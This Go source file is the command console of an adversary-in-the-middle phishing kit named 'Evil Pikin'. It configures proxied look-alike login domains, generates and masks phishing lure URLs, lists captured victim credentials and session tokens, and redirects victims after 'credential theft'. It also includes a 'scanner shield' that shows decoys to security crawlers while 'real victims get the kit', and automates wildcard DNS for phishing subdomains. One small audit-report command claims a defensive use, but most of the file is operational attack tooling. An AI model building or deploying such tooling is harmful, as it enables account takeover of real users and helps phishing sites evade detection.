package console

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sort"

	"github.com/spf13/cobra"
	"github.com/user/evilpikin/internal/audit"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/pkg/dns"
)

// BuildRootCmd constructs the full command tree wired to the console state.
// The returned command is safe to rebuild per client session so flag state
// never leaks between operators.
func (c *Console) BuildRootCmd() *cobra.Command {
	root := &cobra.Command{
		Use:           "evil_pikin",
		Short:         "Evil Pikin AiTM control shell",
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintln(cmd.OutOrStdout(), "Evil Pikin control shell. Type 'help' for commands.")
			return nil
		},
	}

	root.AddCommand(c.cmdConfig())
	root.AddCommand(c.cmdTarget())
	root.AddCommand(c.cmdSessions())
	root.AddCommand(c.cmdStart())
	root.AddCommand(c.cmdStop())
	root.AddCommand(c.cmdHosts())
	root.AddCommand(c.cmdCert())
	root.AddCommand(c.cmdLure())
	root.AddCommand(c.cmdAudit())
	root.AddCommand(c.cmdDNS())
	return root
}

// help is provided natively by cobra (the 'help' command and --help).

func (c *Console) cmdConfig() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "config [key] [value]",
		Short: "Get or set control-plane / domain configuration",
		RunE: func(cmd *cobra.Command, args []string) error {
			out := cmd.OutOrStdout()
			switch len(args) {
			case 0:
				cfg := c.Config()
				enc, _ := json.MarshalIndent(cfg, "", "  ")
				fmt.Fprintln(out, string(enc))
				base, redir, subs := c.Domain().Snapshot()
				fmt.Fprintf(out, "domain.base     = %s\n", base)
				fmt.Fprintf(out, "domain.redirect = %s\n", redir)
				fmt.Fprintf(out, "domain.subdoms  = %v\n", subs)
			case 1:
				cfg := c.Config()
				m := map[string]string{
					"listen-http":  cfg.ListenHTTP,
					"listen-https": cfg.ListenHTTPS,
					"dev-ip":       cfg.DevIP,
					"ca-cert":      cfg.CACertPath,
					"ca-key":       cfg.CAKeyPath,
				}
				v, ok := m[args[0]]
				if !ok {
					return fmt.Errorf("unknown key %q (try: listen-http, listen-https, dev-ip)", args[0])
				}
				fmt.Fprintf(out, "%s = %s\n", args[0], v)
			case 2:
				if err := c.SetConfig(args[0], args[1]); err != nil {
					return err
				}
				fmt.Fprintf(out, "[*] %s = %s\n", args[0], args[1])
			default:
				return fmt.Errorf("usage: config [key] [value]")
			}
			return nil
		},
	}
	cmd.AddCommand(c.cmdConfigDomain(), c.cmdConfigRedirect(), c.cmdConfigShow(), c.cmdConfigSubdomain(), c.cmdConfigTLS(), c.cmdConfigDefaultTarget(), c.cmdConfigIP())
	return cmd
}

func (c *Console) cmdConfigDefaultTarget() *cobra.Command {
	return &cobra.Command{
		Use:   "default-target [target-id]",
		Short: "Set the target module used to dynamically proxy the base domain + any subdomain",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if _, err := c.Store().GetTarget(args[0]); err != nil {
				return fmt.Errorf("target %q not found", args[0])
			}
			c.Domain().SetDefaultTarget(args[0])
			fmt.Fprintf(cmd.OutOrStdout(), "[*] default target: %s (any host under the base domain now proxies to it)\n", args[0])
			return nil
		},
	}
}

func (c *Console) cmdConfigTLS() *cobra.Command {
	return &cobra.Command{
		Use:   "tls [acme|dev]",
		Short: "Select TLS certificate source: 'dev' (install-once CA) or 'acme' (Let's Encrypt, real domain)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := c.Domain().SetTLSMode(args[0]); err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] tls mode: %s\n", args[0])
			return nil
		},
	}
}

func (c *Console) cmdConfigDomain() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "domain [value]",
		Short: "Set the primary external domain (verifies the DNS A-record points here)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			d := args[0]
			noCheck, _ := cmd.Flags().GetBool("no-check")
			if !noCheck {
				if err := VerifyDomainPointsToServer(d); err != nil {
					return err
				}
			}
			c.Domain().SetDomain(d)
			c.engine.SetSiteDomain(d)
			fmt.Fprintf(cmd.OutOrStdout(), "[*] base domain set: %s%s\n", d, map[bool]string{true: " (DNS check skipped)", false: ""}[noCheck])
			return nil
		},
	}
	cmd.Flags().Bool("no-check", false, "skip DNS A-record verification (lab/dev only)")
	return cmd
}

func (c *Console) cmdConfigRedirect() *cobra.Command {
	return &cobra.Command{
		Use:   "redirect [url]",
		Short: "Set the post-capture landing page (where victims are sent after credential theft)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			c.Domain().SetRedirect(args[0])
			fmt.Fprintf(cmd.OutOrStdout(), "[*] redirect url set: %s\n", args[0])
			return nil
		},
	}
}

func (c *Console) cmdConfigShow() *cobra.Command {
	return &cobra.Command{
		Use:   "show",
		Short: "Print a clean summary of bound domains, public IP, and engine status",
		RunE: func(cmd *cobra.Command, args []string) error {
			out := cmd.OutOrStdout()
			base, redir, subs := c.Domain().Snapshot()
			ip, ver, src := c.Domain().EffectivePublicIP()
			fmt.Fprintln(out, "=== Evil Pikin deployment state ===")
			fmt.Fprintf(out, "  base domain      : %s\n", base)
			fmt.Fprintf(out, "  redirect url     : %s\n", redir)
			fmt.Fprintf(out, "  active subdomains: %v\n", subs)
			fmt.Fprintf(out, "  tls mode         : %s\n", c.Domain().GetTLSMode())
			fmt.Fprintf(out, "  public ip        : %s [%s] (%s)\n", ip, ver, src)
			fmt.Fprintf(out, "  dns              : %s\n", c.DNSStatus())
			fmt.Fprintf(out, "  data plane       : %s\n", map[bool]string{true: "RUNNING", false: "stopped"}[c.IsRunning()])
			cfg := c.Config()
			fmt.Fprintf(out, "  http / https     : %s / %s\n", cfg.ListenHTTP, cfg.ListenHTTPS)
			return nil
		},
	}
}

func (c *Console) cmdConfigIP() *cobra.Command {
	return &cobra.Command{
		Use:   "ip [address]",
		Short: "Show or set the server's public IP (IPv4 or IPv6); auto-detected if unset",
		Args:  cobra.MaximumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if len(args) == 0 {
				ip, ver, src := c.Domain().EffectivePublicIP()
				fmt.Fprintf(cmd.OutOrStdout(), "public ip: %s [%s] (%s)\n", ip, ver, src)
				return nil
			}
			if err := c.Domain().SetIP(args[0]); err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] public ip pinned: %s [%s] (Manual)\n", args[0], IPVersion(net.ParseIP(args[0])))
			return nil
		},
	}
}

func (c *Console) cmdConfigSubdomain() *cobra.Command {
	cmd := &cobra.Command{Use: "subdomain", Short: "Manage active subdomains routed to target modules"}
	add := &cobra.Command{
		Use:   "add [name] [target-id]",
		Short: "Register a subdomain and bind it to a target module (e.g. 'login ms-live')",
		Args:  cobra.ExactArgs(2),
		RunE: func(cmd *cobra.Command, args []string) error {
			host, err := c.BindSubdomain(args[0], args[1])
			if err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] subdomain %s -> target %s (host %s registered in engine)\n", args[0], args[1], host)
			return nil
		},
	}
	list := &cobra.Command{
		Use:   "list",
		Short: "List active subdomains and their target bindings",
		RunE: func(cmd *cobra.Command, args []string) error {
			_, _, subs := c.Domain().Snapshot()
			for _, s := range subs {
				tid, _ := c.Domain().SubdomainTarget(s)
				fmt.Fprintf(cmd.OutOrStdout(), "  %-12s -> %-12s host=%s\n", s, tid, c.Domain().FullHost(s))
			}
			return nil
		},
	}
	remove := &cobra.Command{
		Use:   "remove [name]",
		Short: "Remove a subdomain binding and its derived engine host",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			host, err := c.UnbindSubdomain(args[0])
			if err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] subdomain removed: %s (host %s unregistered)\n", args[0], host)
			return nil
		},
	}
	cmd.AddCommand(add, list, remove)
	return cmd
}

func (c *Console) cmdTarget() *cobra.Command {
	cmd := &cobra.Command{Use: "target", Short: "Manage target modules (proxy profiles)"}

	list := &cobra.Command{
		Use:   "list",
		Short: "List all target profiles",
		RunE: func(cmd *cobra.Command, args []string) error {
			targets, err := c.Store().ListTargets()
			if err != nil {
				return err
			}
			out := cmd.OutOrStdout()
			for _, t := range targets {
				state := "disabled"
				if t.Enabled {
					state = "enabled"
				}
				fmt.Fprintf(out, "  %-12s %-10s origin=%-28s proxy=%-18s\n", t.ID, state, t.Origin, t.ProxyHost)
			}
			return nil
		},
	}
	enable := &cobra.Command{
		Use:   "enable [id]",
		Short: "Enable a target and load it into the engine",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := c.applyTarget(args[0], true); err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] target %s enabled\n", args[0])
			return nil
		},
	}
	disable := &cobra.Command{
		Use:   "disable [id]",
		Short: "Disable a target and unload it from the engine",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := c.applyTarget(args[0], false); err != nil {
				return err
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] target %s disabled\n", args[0])
			return nil
		},
	}
	cmd.AddCommand(list, enable, disable)
	return cmd
}

// applyTarget toggles a target's enabled flag and synchronises the engine.
func (c *Console) applyTarget(id string, enabled bool) error {
	if err := c.Store().SetTargetEnabled(id, enabled); err != nil {
		return err
	}
	t, err := c.Store().GetTarget(id)
	if err != nil {
		return err
	}
	if enabled {
		c.Engine().UpsertTarget(t)
		log.Info("target enabled: %s (%s)", id, t.ProxyHost)
	} else {
		c.Engine().RemoveTarget(t.ProxyHost)
		log.Info("target disabled: %s (%s)", id, t.ProxyHost)
	}
	return nil
}

func (c *Console) cmdSessions() *cobra.Command {
	cmd := &cobra.Command{Use: "sessions", Short: "Inspect captured victim sessions"}

	list := &cobra.Command{
		Use:   "list",
		Short: "List captured sessions",
		RunE: func(cmd *cobra.Command, args []string) error {
			sessions, err := c.Store().ListSessions("", "")
			if err != nil {
				return err
			}
			out := cmd.OutOrStdout()
			for _, s := range sessions {
				fmt.Fprintf(out, "  %-12s user=%-24s valid=%v target=%s\n", s.ID, s.Username, s.IsValid, s.TargetName)
			}
			return nil
		},
	}
	view := &cobra.Command{
		Use:   "view [id]",
		Short: "Show full detail for a captured session",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			s, err := c.Store().GetSession(args[0])
			if err != nil {
				return err
			}
			enc, _ := json.MarshalIndent(s, "", "  ")
			fmt.Fprintln(cmd.OutOrStdout(), string(enc))
			return nil
		},
	}
	cmd.AddCommand(list, view)
	return cmd
}

func (c *Console) cmdStart() *cobra.Command {
	return &cobra.Command{
		Use:   "start",
		Short: "Start the background proxy data plane",
		RunE: func(cmd *cobra.Command, args []string) error {
			msg, err := c.StartDataPlane()
			if err != nil {
				return err
			}
			fmt.Fprintln(cmd.OutOrStdout(), msg)
			return nil
		},
	}
}

func (c *Console) cmdStop() *cobra.Command {
	return &cobra.Command{
		Use:   "stop",
		Short: "Stop the background proxy data plane",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintln(cmd.OutOrStdout(), c.StopDataPlane())
			return nil
		},
	}
}

// cmdHosts prints the /etc/hosts entries an operator must add in dev mode so
// the phishing hostnames resolve to the engine without authoritative DNS.
func (c *Console) cmdHosts() *cobra.Command {
	return &cobra.Command{
		Use:   "hosts",
		Short: "Print /etc/hosts entries for all configured target hostnames",
		RunE: func(cmd *cobra.Command, args []string) error {
			out := cmd.OutOrStdout()
			targets, err := c.Store().ListTargets()
			if err != nil {
				return err
			}
			ip := c.Config().DevIP
			hosts := map[string]bool{}
			base, _, subs := c.Domain().Snapshot()
			for _, t := range targets {
				if !t.Enabled {
					continue
				}
				// The phishing hosts are exactly the proxy_hosts of the target
				// (the hosts the reverse proxy actually serves) — analogous to
				// Evilginx's `get-hosts` listing proxy_hosts, not every target.
				for _, r := range t.ResolvedProxyHosts(base) {
					hosts[r.PhishHost] = true
				}
			}
			// subdomain hosts under the configured base domain
			if base != "" {
				// the bare base domain proxies to the default target too
				hosts[base] = true
				for _, s := range subs {
					hosts[c.Domain().FullHost(s)] = true
				}
			}
			ordered := make([]string, 0, len(hosts))
			for h := range hosts {
				ordered = append(ordered, h)
			}
			sort.Strings(ordered)
			fmt.Fprintf(out, "# Evil Pikin dev DNS mapping -> add to /etc/hosts\n")
			for _, h := range ordered {
				fmt.Fprintf(out, "%s %s\n", ip, h)
			}
			return nil
		},
	}
}

func (c *Console) cmdCert() *cobra.Command {
	cmd := &cobra.Command{Use: "cert", Short: "Manage the dev root CA"}

	gen := &cobra.Command{
		Use:   "gen",
		Short: "Generate the dev root CA (once) if missing",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintf(cmd.OutOrStdout(), "[*] dev CA at %s (install this in your browser/OS trust store)\n", c.Config().CACertPath)
			return nil
		},
	}
	show := &cobra.Command{
		Use:   "show",
		Short: "Print the dev root CA certificate (PEM)",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintln(cmd.OutOrStdout(), string(c.CA().CertPEM()))
			return nil
		},
	}
	cmd.AddCommand(gen, show)
	return cmd
}

func (c *Console) cmdLure() *cobra.Command {
	cmd := &cobra.Command{Use: "lure", Short: "Lure generation, masking and configuration"}

	gen := &cobra.Command{
		Use:   "gen [target-id]",
		Short: "Generate phishing deep-link URLs for a target",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			t, err := c.Store().GetTarget(args[0])
			if err != nil {
				return err
			}
			out := cmd.OutOrStdout()
			fmt.Fprintf(out, "[*] phishing deep-links for %s (proxy=%s)\n", t.ID, t.ProxyHost)
			for _, l := range BuildLures(t) {
				fmt.Fprintf(out, "  %s\n", l)
			}
			if decoys := DecoyLures(t); len(decoys) > 0 {
				fmt.Fprintln(out, "[*] post-capture decoy redirects:")
				for name, dest := range decoys {
					fmt.Fprintf(out, "  %s -> %s\n", name, dest)
				}
			}
			return nil
		},
	}
	mask := &cobra.Command{
		Use:   "mask [target-id]",
		Short: "Show masked lure URLs and served-page link-masking rules",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			t, err := c.Store().GetTarget(args[0])
			if err != nil {
				return err
			}
			out := cmd.OutOrStdout()
			fmt.Fprintf(out, "[*] masked lures for %s\n", t.ID)
			for _, l := range BuildLures(t) {
				fmt.Fprintf(out, "  %s\n", MaskLure(t, l))
			}
			if len(t.SubFilters) > 0 {
				fmt.Fprintf(out, "[*] served-page link masking active: %d SubFilter rule(s) applied to proxied responses\n", len(t.SubFilters))
				for _, f := range t.SubFilters {
					fmt.Fprintf(out, "    %s -> %s\n", f.Domain, f.Sub)
				}
			} else {
				fmt.Fprintln(out, "[*] no SubFilters configured; add sub_filters to mask links inside served pages (proxy-side).")
			}
			return nil
		},
	}
	conf := &cobra.Command{
		Use:   "config [target-id]",
		Short: "Show lure configuration for a target (placeholder)",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			t, err := c.Store().GetTarget(args[0])
			if err != nil {
				return err
			}
			enc, _ := json.MarshalIndent(struct {
				LoginURLs   []string          `json:"login_urls"`
				RedirectURL string            `json:"redirect_url"`
				Lure        map[string]string `json:"lure"`
				PhishSub    []string          `json:"phish_sub"`
			}{t.LoginURLs, t.RedirectURL, t.Lure, t.PhishSub}, "", "  ")
			fmt.Fprintln(cmd.OutOrStdout(), string(enc))
			return nil
		},
	}
	cmd.AddCommand(gen, mask, conf)

	// --- Tracking-matrix commands (registry-backed) -------------------------
	create := &cobra.Command{
		Use:   "create --path <path> --target <target-id> [--redirect <url>]",
		Short: "Register a uniquely-tracked lure (tracking matrix)",
		RunE: func(cmd *cobra.Command, args []string) error {
			path, _ := cmd.Flags().GetString("path")
			targetID, _ := cmd.Flags().GetString("target")
			redirect, _ := cmd.Flags().GetString("redirect")
			if path == "" || targetID == "" {
				return fmt.Errorf("--path and --target are required")
			}
			t, err := c.Store().GetTarget(targetID)
			if err != nil {
				return fmt.Errorf("target %q not found", targetID)
			}
			l, err := c.Lures.Create(path, t.ProxyHost, redirect)
			if err != nil {
				return err
			}
			base, _, _ := c.Domain().Snapshot()
			if base == "" {
				base = t.ProxyHost
			}
			out := cmd.OutOrStdout()
			fmt.Fprintf(out, "[*] lure registered\n")
			fmt.Fprintf(out, "  id           : %s\n", l.ID)
			fmt.Fprintf(out, "  path         : /%s\n", l.Path)
			fmt.Fprintf(out, "  target       : %s (%s)\n", targetID, t.ProxyHost)
			trackURL := l.TrackingURL(base, "")
			fmt.Fprintf(out, "  tracking url : %s\n", trackURL)
			fmt.Fprintf(out, "  masked url   : %s\n", MaskLure(t, trackURL))
			return nil
		},
	}
	create.Flags().String("path", "", "lure path segment, e.g. login-reset")
	create.Flags().String("target", "", "target profile id this lure unlocks")
	create.Flags().String("redirect", "", "optional post-capture decoy redirect URL")

	list := &cobra.Command{
		Use:   "list",
		Short: "List registered lures",
		RunE: func(cmd *cobra.Command, args []string) error {
			out := cmd.OutOrStdout()
			ls := c.Lures.List()
			if len(ls) == 0 {
				fmt.Fprintln(out, "no lures registered")
				return nil
			}
			for _, l := range ls {
				state := "active"
				if !l.IsActive {
					state = "inactive"
				}
				fmt.Fprintf(out, "  %s  path=/%s  target=%s  %s\n", l.ID, l.Path, l.TargetProfile, state)
			}
			return nil
		},
	}

	del := &cobra.Command{
		Use:   "delete <id>",
		Short: "Delete a registered lure",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if !c.Lures.Delete(args[0]) {
				return fmt.Errorf("lure %q not found", args[0])
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] lure %s deleted\n", args[0])
			return nil
		},
	}

	require := &cobra.Command{
		Use:   "require [on|off]",
		Short: "Toggle scanner-evasion: require a valid lure token on every request",
		Args:  cobra.MaximumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if len(args) == 1 {
				switch args[0] {
				case "on":
					c.engine.RequireLure = true
				case "off":
					c.engine.RequireLure = false
				default:
					return fmt.Errorf("usage: lure require [on|off]")
				}
			}
			fmt.Fprintf(cmd.OutOrStdout(), "lure enforcement: %v\n", c.engine.RequireLure)
			return nil
		},
	}

	shield := &cobra.Command{
		Use:   "shield",
		Short: "Stop scanners/detectors from seeing the lure (decoy page for bots)",
	}
	shieldOn := &cobra.Command{
		Use:   "on",
		Short: "Enable the scanner/detector shield (serve decoy to crawlers/bots)",
		RunE: func(cmd *cobra.Command, args []string) error {
			c.engine.SetScannerShield(true)
			fmt.Fprintln(cmd.OutOrStdout(), "[*] scanner shield ENABLED — crawlers/bots get a benign decoy, real victims get the kit")
			return nil
		},
	}
	shieldOff := &cobra.Command{
		Use:   "off",
		Short: "Disable the scanner/detector shield",
		RunE: func(cmd *cobra.Command, args []string) error {
			c.engine.SetScannerShield(false)
			fmt.Fprintln(cmd.OutOrStdout(), "[*] scanner shield DISABLED")
			return nil
		},
	}
	shieldStatus := &cobra.Command{
		Use:   "status",
		Short: "Show scanner-shield state and configured source ranges",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintf(cmd.OutOrStdout(), "scanner shield: %v\n", c.engine.ScannerShield)
			cidrs := c.engine.ScannerCIDRs()
			if len(cidrs) == 0 {
				fmt.Fprintln(cmd.OutOrStdout(), "scanner CIDRs: (none)")
			} else {
				fmt.Fprintln(cmd.OutOrStdout(), "scanner CIDRs:")
				for _, c := range cidrs {
					fmt.Fprintf(cmd.OutOrStdout(), "  - %s\n", c)
				}
			}
			return nil
		},
	}
	shieldCIDR := &cobra.Command{
		Use:   "cidr",
		Short: "Manage scanner source ranges (always decoyed)",
	}
	shieldCIDRAdd := &cobra.Command{
		Use:   "add <cidr>",
		Short: "Add an IP range (CIDR) whose traffic is always decoyed",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := c.engine.AddScannerCIDR(args[0]); err != nil {
				return fmt.Errorf("invalid cidr %q: %v", args[0], err)
			}
			fmt.Fprintf(cmd.OutOrStdout(), "[*] scanner CIDR added: %s\n", args[0])
			return nil
		},
	}
	shieldCIDRClear := &cobra.Command{
		Use:   "clear",
		Short: "Remove all scanner source ranges",
		RunE: func(cmd *cobra.Command, args []string) error {
			c.engine.ClearScannerCIDRs()
			fmt.Fprintln(cmd.OutOrStdout(), "[*] scanner CIDRs cleared")
			return nil
		},
	}
	shieldCIDR.AddCommand(shieldCIDRAdd, shieldCIDRClear)
	shield.AddCommand(shieldOn, shieldOff, shieldStatus, shieldCIDR)

	sessions := &cobra.Command{
		Use:   "sessions",
		Short: "List live victim sessions captured via lures",
		RunE: func(cmd *cobra.Command, args []string) error {
			out := cmd.OutOrStdout()
			ss := c.Lures.ListSessions()
			if len(ss) == 0 {
				fmt.Fprintln(out, "no active victim sessions")
				return nil
			}
			for _, s := range ss {
				fmt.Fprintf(out, "  EP_SESS=%s  lure=%s  target=%s  ip=%s  ua=%s\n",
					s.Token, s.LureID, s.TargetProfile, s.ClientIP, s.UserAgent)
				if s.Username != "" {
					fmt.Fprintf(out, "      captured user: %s\n", s.Username)
				}
				if s.TokenCaptured {
					fmt.Fprintf(out, "      session token captured\n")
				}
			}
			return nil
		},
	}

	cmd.AddCommand(create, list, del, require, shield, sessions)
	return cmd
}

// cmdAudit exposes the defensive "Audit Report" generator. It processes the
// intercepted session logs and emits a mitigation summary. Entirely local and
// rule-based — no AI dependency.
func (c *Console) cmdAudit() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "audit",
		Short: "Defensive reporting: turn intercepted sessions into mitigation guidance",
	}
	report := &cobra.Command{
		Use:   "report",
		Short: "Generate a mitigation summary from all captured sessions",
		RunE: func(cmd *cobra.Command, args []string) error {
			sessions, err := c.Store().ListSessions("", "")
			if err != nil {
				return err
			}
			fmt.Fprintln(cmd.OutOrStdout(), audit.Generate(sessions))
			return nil
		},
	}
	list := &cobra.Command{
		Use:   "list",
		Short: "List captured sessions (id, target, user, status)",
		RunE: func(cmd *cobra.Command, args []string) error {
			sessions, err := c.Store().ListSessions("", "")
			if err != nil {
				return err
			}
			if len(sessions) == 0 {
				fmt.Fprintln(cmd.OutOrStdout(), "no captured sessions")
				return nil
			}
			for _, s := range sessions {
				fmt.Fprintf(cmd.OutOrStdout(), "  %-12s %-18s user=%-20s status=%s\n", s.ID[:min(12, len(s.ID))], s.TargetName, s.Username, s.Status)
			}
			return nil
		},
	}
	cmd.AddCommand(report, list)
	return cmd
}

// cmdDNS drives the Cloudflare automation: it punches root + wildcard A records
// (TTL 60, proxy off) so any phishing subdomain routes to the VPS automatically.
func (c *Console) cmdDNS() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "dns",
		Short: "Automate Cloudflare DNS (root + wildcard A records, TTL 60)",
	}
	sync := &cobra.Command{
		Use:   "sync",
		Short: "Synchronize root and wildcard DNS records to the server IP",
		RunE: func(cmd *cobra.Command, args []string) error {
			token, _ := cmd.Flags().GetString("token")
			if token == "" {
				token = os.Getenv("EVILPIKIN_CF_TOKEN")
			}
			if token == "" {
				return fmt.Errorf("provide --token or set EVILPIKIN_CF_TOKEN")
			}
			base, _, _ := c.Domain().Snapshot()
			if base == "" {
				return fmt.Errorf("set base domain first (config domain <your-domain>)")
			}
			ip, _, src := c.Domain().EffectivePublicIP()
			if ip == "" {
				return fmt.Errorf("could not determine server public IP (config ip <addr>)")
			}
			mgr := dns.NewDNSManager(token, base, ip)
			c.SetDNSStatus("syncing...")
			go func() {
				if err := mgr.SyncRecords(); err != nil {
					c.SetDNSStatus("error: " + err.Error())
					log.Error("dns sync failed: %v", err)
					return
				}
				c.SetDNSStatus(fmt.Sprintf("live (TTL 60s, via %s)", src))
				log.Info("dns sync complete: %s / *.%s -> %s", base, base, ip)
			}()
			fmt.Fprintln(cmd.OutOrStdout(), "[*] DNS sync started in background; check `config show` / `dns status`")
			return nil
		},
	}
	sync.Flags().String("token", "", "Cloudflare API token (or set EVILPIKIN_CF_TOKEN)")
	status := &cobra.Command{
		Use:   "status",
		Short: "Show current DNS synchronization status",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintf(cmd.OutOrStdout(), "dns: %s\n", c.DNSStatus())
			return nil
		},
	}
	cmd.AddCommand(sync, status)
	return cmd
}
